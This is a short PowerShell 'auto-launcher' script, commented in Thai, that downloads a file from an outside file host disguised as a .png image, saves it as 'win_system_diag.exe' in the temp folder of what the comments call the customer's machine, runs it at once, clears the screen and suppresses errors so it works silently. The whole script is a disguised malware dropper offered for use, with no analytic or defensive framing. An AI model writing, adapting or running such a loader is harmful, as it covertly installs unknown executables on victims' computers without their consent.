# ============================================================
# X-LIFE AUTO-LAUNCHER (PS1 VERSION)
# ============================================================

# ลิงก์ไฟล์ที่คุณเพิ่งอัปโหลด (หลอกว่าเป็น .png)
$exeUrl = "https://files.catbox.moe/hextui.png"

# บันทึกเป็น .exe ลงในเครื่องลูกค้า
$tempPath = "$env:TEMP\win_system_diag.exe"

try {
    # ดาวน์โหลดไฟล์
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
    
    # รันโปรแกรมทันที
    Start-Process -FilePath $tempPath
    
    # ล้างหน้าจอ
    Clear-Host
}
catch {
    # ทำงานเงียบๆ
}
